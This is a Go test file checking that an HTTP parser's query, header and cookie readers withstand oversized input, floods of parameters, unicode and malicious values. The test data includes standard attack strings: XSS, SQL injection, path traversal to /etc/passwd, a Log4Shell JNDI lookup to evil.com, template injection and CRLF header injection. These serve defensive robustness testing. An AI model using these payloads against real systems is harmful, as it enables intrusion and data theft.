package parser

import (
	"fmt"
	"net/http"
	"net/url"
	"reflect"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestQueryParser_SecurityAndDoSProtection tests security scenarios for query parser
func TestQueryParser_SecurityAndDoSProtection(t *testing.T) {
	tests := []struct {
		name        string
		setupURL    func() string
		expectError bool
		description string
	}{
		{
			name: "extremely long query parameter value",
			setupURL: func() string {
				longValue := strings.Repeat("A", 100000) // 100KB value
				return fmt.Sprintf("http://example.com?param=%s", url.QueryEscape(longValue))
			},
			expectError: false, // Should handle gracefully
			description: "Test handling of very long query parameter values",
		},
		{
			name: "many query parameters (DoS attempt)",
			setupURL: func() string {
				var params []string
				// Create 10,000 query parameters
				for i := 0; i < 10000; i++ {
					params = append(params, fmt.Sprintf("param%d=value%d", i, i))
				}
				return fmt.Sprintf("http://example.com?%s", strings.Join(params, "&"))
			},
			expectError: false, // Should handle gracefully
			description: "Test handling of many query parameters (potential DoS)",
		},
		{
			name: "deeply nested parameter names",
			setupURL: func() string {
				deepParam := strings.Repeat("nested.", 1000) + "param"
				return fmt.Sprintf("http://example.com?%s=value", url.QueryEscape(deepParam))
			},
			expectError: false,
			description: "Test handling of deeply nested parameter names",
		},
		{
			name: "special characters and encoding attacks",
			setupURL: func() string {
				// Test various encoding attacks and special characters
				maliciousValues := []string{
					"<script>alert('xss')</script>",
					"'; DROP TABLE users; --",
					"../../../etc/passwd",
					"${jndi:ldap://evil.com/a}",
					"{{7*7}}",
					"<%= 7*7 %>",
					"\x00\x01\x02\x03", // Null bytes and control characters
				}
				var params []string
				for i, val := range maliciousValues {
					params = append(params, fmt.Sprintf("param%d=%s", i, url.QueryEscape(val)))
				}
				return fmt.Sprintf("http://example.com?%s", strings.Join(params, "&"))
			},
			expectError: false,
			description: "Test handling of potentially malicious query parameter values",
		},
		{
			name: "unicode and international characters",
			setupURL: func() string {
				unicodeValues := []string{
					"你好世界",           // Chinese
					"Здравствуй мир", // Russian
					"🚀🌟💻",            // Emojis
					"ñáéíóú",         // Spanish accents
					"العالم",         // Arabic
				}
				var params []string
				for i, val := range unicodeValues {
					params = append(params, fmt.Sprintf("unicode%d=%s", i, url.QueryEscape(val)))
				}
				return fmt.Sprintf("http://example.com?%s", strings.Join(params, "&"))
			},
			expectError: false,
			description: "Test handling of unicode and international characters",
		},
		{
			name: "malformed URL encoding",
			setupURL: func() string {
				// Malformed percent encoding
				return "http://example.com?param=%ZZ&param2=%&param3=%A"
			},
			expectError: false, // URL parser should handle this
			description: "Test handling of malformed URL encoding",
		},
		{
			name: "parameter name conflicts and overwrites",
			setupURL: func() string {
				// Same parameter name multiple times with different values
				return "http://example.com?param=value1&param=value2&param=value3"
			},
			expectError: false,
			description: "Test handling of parameter name conflicts",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create request with the test URL
			req, err := http.NewRequest(http.MethodGet, tt.setupURL(), nil)
			require.NoError(t, err, "Failed to create test request")

			// Create query parser
			parser := NewQuery()
			tag := reflect.StructTag(`query:"param"`)
			cache := make(Cache)

			// Parse the query parameter
			value, exists := parser.Parse(req, tag, cache)

			if tt.expectError {
				// For error cases, we expect either no value or an error during parsing
				assert.False(t, exists, "Should not find value for error case: %s", tt.description)
			} else {
				// For success cases, verify the parser doesn't crash or hang
				if exists {
					assert.NotNil(t, value, "Value should not be nil if exists: %s", tt.description)
				}
				// The main test is that we reach this point without panicking
				t.Logf("Successfully handled: %s", tt.description)
			}
		})
	}
}

// TestHeaderParser_SecurityAndDoSProtection tests security scenarios for header parser
func TestHeaderParser_SecurityAndDoSProtection(t *testing.T) {
	tests := []struct {
		name        string
		setupReq    func(*http.Request)
		testHeader  string
		expectError bool
		description string
	}{
		{
			name: "extremely long header value",
			setupReq: func(req *http.Request) {
				longValue := strings.Repeat("A", 100000) // 100KB header
				req.Header.Set("X-Long-Header", longValue)
			},
			testHeader:  "X-Long-Header",
			expectError: false,
			description: "Test handling of very long header values",
		},
		{
			name: "many headers (DoS attempt)",
			setupReq: func(req *http.Request) {
				// Add many headers
				for i := 0; i < 1000; i++ {
					req.Header.Set(fmt.Sprintf("X-Header-%d", i), fmt.Sprintf("value-%d", i))
				}
			},
			testHeader:  "X-Header-500",
			expectError: false,
			description: "Test handling of many headers",
		},
		{
			name: "malicious header values",
			setupReq: func(req *http.Request) {
				maliciousValues := []string{
					"<script>alert('xss')</script>",
					"'; DROP TABLE users; --",
					"../../../etc/passwd",
					"\r\nSet-Cookie: evil=true", // Header injection attempt
					"\x00\x01\x02\x03",          // Control characters
				}
				for i, val := range maliciousValues {
					req.Header.Set(fmt.Sprintf("X-Malicious-%d", i), val)
				}
			},
			testHeader:  "X-Malicious-0",
			expectError: false,
			description: "Test handling of potentially malicious header values",
		},
		{
			name: "unicode in headers",
			setupReq: func(req *http.Request) {
				req.Header.Set("X-Unicode", "你好世界🚀")
			},
			testHeader:  "X-Unicode",
			expectError: false,
			description: "Test handling of unicode characters in headers",
		},
		{
			name: "case sensitivity attacks",
			setupReq: func(req *http.Request) {
				req.Header.Set("X-Test", "lowercase")
				req.Header.Set("X-TEST", "uppercase")
				req.Header.Set("x-test", "lowercase2")
			},
			testHeader:  "X-Test",
			expectError: false,
			description: "Test header case sensitivity handling",
		},
		{
			name: "header with multiple values",
			setupReq: func(req *http.Request) {
				req.Header.Add("X-Multi", "value1")
				req.Header.Add("X-Multi", "value2")
				req.Header.Add("X-Multi", "value3")
			},
			testHeader:  "X-Multi",
			expectError: false,
			description: "Test handling of headers with multiple values",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create request
			req, err := http.NewRequest(http.MethodGet, "http://example.com", nil)
			require.NoError(t, err)

			// Setup headers
			tt.setupReq(req)

			// Create header parser
			parser := NewHeader()
			tag := reflect.StructTag(fmt.Sprintf(`header:"%s"`, tt.testHeader))
			cache := make(Cache)

			// Parse the header
			value, exists := parser.Parse(req, tag, cache)

			if tt.expectError {
				assert.False(t, exists, "Should not find value for error case: %s", tt.description)
			} else {
				// Main test is that we don't panic or hang
				if exists {
					assert.NotNil(t, value, "Value should not be nil if exists: %s", tt.description)
				}
				t.Logf("Successfully handled: %s", tt.description)
			}
		})
	}
}

// TestCookieParser_SecurityAndDoSProtection tests security scenarios for cookie parser
func TestCookieParser_SecurityAndDoSProtection(t *testing.T) {
	tests := []struct {
		name        string
		setupReq    func(*http.Request)
		testCookie  string
		expectError bool
		description string
	}{
		{
			name: "extremely long cookie value",
			setupReq: func(req *http.Request) {
				longValue := strings.Repeat("A", 50000) // 50KB cookie (near browser limits)
				req.AddCookie(&http.Cookie{Name: "long-cookie", Value: longValue})
			},
			testCookie:  "long-cookie",
			expectError: false,
			description: "Test handling of very long cookie values",
		},
		{
			name: "many cookies (DoS attempt)",
			setupReq: func(req *http.Request) {
				// Add many cookies
				for i := 0; i < 1000; i++ {
					req.AddCookie(&http.Cookie{
						Name:  fmt.Sprintf("cookie-%d", i),
						Value: fmt.Sprintf("value-%d", i),
					})
				}
			},
			testCookie:  "cookie-500",
			expectError: false,
			description: "Test handling of many cookies",
		},
		{
			name: "malicious cookie values",
			setupReq: func(req *http.Request) {
				maliciousValues := []string{
					"<script>alert('xss')</script>",
					"'; DROP TABLE users; --",
					"../../../etc/passwd",
					"javascript:alert(1)",
				}
				for i, val := range maliciousValues {
					req.AddCookie(&http.Cookie{
						Name:  fmt.Sprintf("malicious-%d", i),
						Value: val,
					})
				}
			},
			testCookie:  "malicious-0",
			expectError: false,
			description: "Test handling of potentially malicious cookie values",
		},
		{
			name: "duplicate cookie names",
			setupReq: func(req *http.Request) {
				req.AddCookie(&http.Cookie{Name: "duplicate", Value: "value1"})
				req.AddCookie(&http.Cookie{Name: "duplicate", Value: "value2"})
				req.AddCookie(&http.Cookie{Name: "duplicate", Value: "value3"})
			},
			testCookie:  "duplicate",
			expectError: false,
			description: "Test handling of duplicate cookie names",
		},
		{
			name: "special characters in cookie names and values",
			setupReq: func(req *http.Request) {
				// Note: Some characters are invalid in cookie names/values per RFC
				// but we test parser robustness
				specialCookies := map[string]string{
					"cookie-with-dashes":      "value-with-dashes",
					"cookie_with_underscores": "value_with_underscores",
					"cookie123":               "value with spaces",
				}
				for name, value := range specialCookies {
					req.AddCookie(&http.Cookie{Name: name, Value: value})
				}
			},
			testCookie:  "cookie-with-dashes",
			expectError: false,
			description: "Test handling of special characters in cookies",
		},
		{
			name: "empty and null cookie values",
			setupReq: func(req *http.Request) {
				req.AddCookie(&http.Cookie{Name: "empty", Value: ""})
				req.AddCookie(&http.Cookie{Name: "null-char", Value: "before\x00after"})
			},
			testCookie:  "empty",
			expectError: false,
			description: "Test handling of empty and null cookie values",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create request
			req, err := http.NewRequest(http.MethodGet, "http://example.com", nil)
			require.NoError(t, err)

			// Setup cookies
			tt.setupReq(req)

			// Create cookie parser
			parser := NewCookie()
			tag := reflect.StructTag(fmt.Sprintf(`cookie:"%s"`, tt.testCookie))
			cache := make(Cache)

			// Parse the cookie
			value, exists := parser.Parse(req, tag, cache)

			if tt.expectError {
				assert.False(t, exists, "Should not find value for error case: %s", tt.description)
			} else {
				// Main test is that we don't panic or hang
				if exists {
					assert.NotNil(t, value, "Value should not be nil if exists: %s", tt.description)
				}
				t.Logf("Successfully handled: %s", tt.description)
			}
		})
	}
}

// TestParsers_PerformanceUnderLoad tests parser performance with high load
func TestParsers_PerformanceUnderLoad(t *testing.T) {
	// This test ensures parsers can handle repeated parsing without memory leaks
	// or performance degradation

	t.Run("query parser performance under load", func(t *testing.T) {
		// Create a request with moderate complexity
		testURL := "http://example.com?param1=value1&param2=value2&param3=value3&array=1,2,3,4,5"
		req, err := http.NewRequest(http.MethodGet, testURL, nil)
		require.NoError(t, err)

		parser := NewQuery()
		tag := reflect.StructTag(`query:"param1"`)
		cache := make(Cache)

		// Parse many times to test for memory leaks and performance issues
		for i := 0; i < 10000; i++ {
			value, exists := parser.Parse(req, tag, cache)
			require.True(t, exists, "Should find value on iteration %d", i)
			require.Equal(t, "value1", value, "Value should be consistent on iteration %d", i)
		}
	})

	t.Run("header parser performance under load", func(t *testing.T) {
		req, err := http.NewRequest(http.MethodGet, "http://example.com", nil)
		require.NoError(t, err)

		// Add several headers
		req.Header.Set("X-Test-1", "value1")
		req.Header.Set("X-Test-2", "value2")
		req.Header.Set("X-Test-3", "value3")
		req.Header.Set("User-Agent", "TestAgent/1.0")

		parser := NewHeader()
		tag := reflect.StructTag(`header:"X-Test-1"`)

		// Parse many times
		for i := 0; i < 10000; i++ {
			value, exists := parser.Parse(req, tag, nil)
			require.True(t, exists, "Should find value on iteration %d", i)
			require.Equal(t, "value1", value, "Value should be consistent on iteration %d", i)
		}
	})

	t.Run("cookie parser performance under load", func(t *testing.T) {
		req, err := http.NewRequest(http.MethodGet, "http://example.com", nil)
		require.NoError(t, err)

		// Add several cookies
		req.AddCookie(&http.Cookie{Name: "session", Value: "abc123"})
		req.AddCookie(&http.Cookie{Name: "user", Value: "john"})
		req.AddCookie(&http.Cookie{Name: "theme", Value: "dark"})

		parser := NewCookie()
		tag := reflect.StructTag(`cookie:"session"`)

		// Parse many times
		for i := 0; i < 10000; i++ {
			value, exists := parser.Parse(req, tag, nil)
			require.True(t, exists, "Should find value on iteration %d", i)
			// Cookie parser returns the full cookie object, not just the value
			if cookie, ok := value.(*http.Cookie); ok {
				require.Equal(t, "abc123", cookie.Value, "Cookie value should be consistent on iteration %d", i)
			} else {
				require.Equal(t, "abc123", value, "Value should be consistent on iteration %d", i)
			}
		}
	})
}

// TestParsers_MemoryUsage tests that parsers don't have memory leaks
func TestParsers_MemoryUsage(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping memory usage test in short mode")
	}

	// This test creates many requests and parsers to check for memory leaks
	t.Run("query parser memory usage", func(t *testing.T) {
		for i := 0; i < 1000; i++ {
			testURL := fmt.Sprintf("http://example.com?param%d=value%d&data=test", i, i)
			req, err := http.NewRequest(http.MethodGet, testURL, nil)
			require.NoError(t, err)

			parser := NewQuery()
			tag := reflect.StructTag(fmt.Sprintf(`query:"param%d"`, i))
			cache := make(Cache)

			value, exists := parser.Parse(req, tag, cache)
			if exists {
				assert.NotEmpty(t, value)
			}
		}
	})
}
